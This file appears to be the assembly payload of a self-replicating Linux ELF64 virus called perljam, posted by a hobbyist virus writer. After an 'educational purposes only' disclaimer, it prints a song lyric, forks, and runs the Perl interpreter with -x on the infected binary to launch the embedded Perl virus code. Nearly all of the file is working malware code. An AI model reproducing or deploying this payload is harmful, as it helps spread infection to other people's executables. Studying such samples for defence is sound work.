; perljam.s
; written by isra - isra _replace_by_@_ fastmail.net - https://hckng.org
;
; https://hckng.org/articles/perljam-elf64-virus.html
; https://git.sr.ht/~hckng/vx/tree/master/item/perljam.s
; https://github.com/ilv/vx/blob/main/perljam.s
;
; version 0.2 - 04.08.2023
;
; payload for perljam.pl
;
; it prints to stdout an extract from the song "release" by Pearl Jam and then
; replicates the virus by running perljam.pl source code embedded in the
; infected binary
;
; perljam.s was made for educational purposes only, I'm not responsible
; for any misuse or damage caused by this program. Use it at your own risk.
;
; thanks to tmp0ut and vxug for all the resources
;
; main references:
; - https://www.guitmz.com/linux-midrashim-elf-virus/
; - https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf/
; - https://tmpout.sh/1/3.html
; - https://tmpout.sh/1/2.html
;

BITS 64
global _start
section .text
_start:
    call main
    db "i am myself, like you somehow", 0xa, 0x0
    db "/usr/bin/perl", 0x0
    db "-x", 0x0
    db "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
    db "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
    db "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
    db "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", 0x0
    
 main:
    ;;;;;;;;;;;;
    ; print msg
    ;;;;;;;;;;;;
    xor rax, rax
    xor rdx, rdx
    inc al
    mov rdi, rax
    pop rsi
    mov dl, 30
    syscall

    ;;;;;;;;
    ; fork
    ;;;;;;;;
    xor rax, rax
    mov rax, 57
    syscall
    test eax, eax
    jne parent

    ;;;;;;;;;;;;;;;;;;;;;;;;;
    ; call perl interpreter
    ;;;;;;;;;;;;;;;;;;;;;;;;;

    ; filename "/usr/bin/perl"
    lea rdi, [rsi+31]   
    
    ; argv
    ; ["/usr/bin/perl", "-x", "xxxxx..."] (on reverse)
    xor rdx, rdx
    push rdx
    lea rbx, [rsi+48] ; "xxx..."
    push rbx
    lea rbx, [rsi+45] ; "-x"
    push rbx
    push rdi          ; "/usr/bin/perl"
    mov rsi, rsp 

    ; execve & exit
    xor rax, rax
    mov rax, 59
    mov rdx, 0
    syscall
    xor rdx, rdx
    mov rax, 60
    syscall

parent:
    ; cleanup for the jmp instruction
    xor rax, rax
    xor rdx, rdx
